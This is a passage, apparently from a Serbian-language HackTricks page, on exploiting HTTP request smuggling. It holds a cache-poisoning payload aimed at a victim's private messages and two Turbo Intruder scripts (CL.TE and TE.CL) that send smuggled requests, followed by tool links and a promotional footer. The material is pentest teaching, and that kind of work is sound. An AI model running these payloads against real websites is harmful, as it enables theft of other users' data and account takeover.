Napadač kreira krijumčareni zahtev koji dohvata osetljiv sadržaj specifičan za korisnika. Razmotrite sledeći primer:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Ako ovaj krijumčareni zahtev zatrova keš zapis namenjen statičkom sadržaju (npr. `/someimage.png`), osetljivi podaci žrtve iz `/private/messages` mogu biti keširani pod keš zapisom statičkog sadržaja. Kao rezultat toga, napadač bi potencijalno mogao povratiti ove keširane osetljive podatke.

### Oružjevanje HTTP Request Smuggling-a sa HTTP Response Desynchronisation

Da li ste pronašli neku ranjivost u HTTP Request Smuggling-u i ne znate kako da je iskoristite? Pokušajte sa ovom drugom metodom iskorišćavanja:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Turbo intruder skripte

### CL.TE

Sa [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Od: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Alati

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Ovaj alat je gramatički bazirani HTTP Fuzzer koristan za pronalaženje nepravilnosti u zahtevima za švercovanje.

## Reference

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
